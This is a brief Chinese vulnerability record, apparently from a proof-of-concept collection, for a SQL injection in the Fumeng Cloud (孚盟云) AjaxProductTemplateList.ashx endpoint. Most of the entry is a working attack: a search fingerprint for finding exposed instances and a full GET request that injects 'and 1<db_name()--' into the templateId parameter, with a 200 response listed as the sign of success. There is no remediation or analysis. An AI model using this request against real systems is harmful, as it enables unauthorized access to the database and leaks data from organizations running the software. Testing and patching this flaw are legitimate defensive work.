# 孚盟云AjaxProductTemplateList存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`GET /m/Dingding/Ajax/AjaxProductTemplateList.ashx?method=SendMail&templateId=1+and+1%3Cdb_name()-- HTTP/1.1`
- **响应特征**：200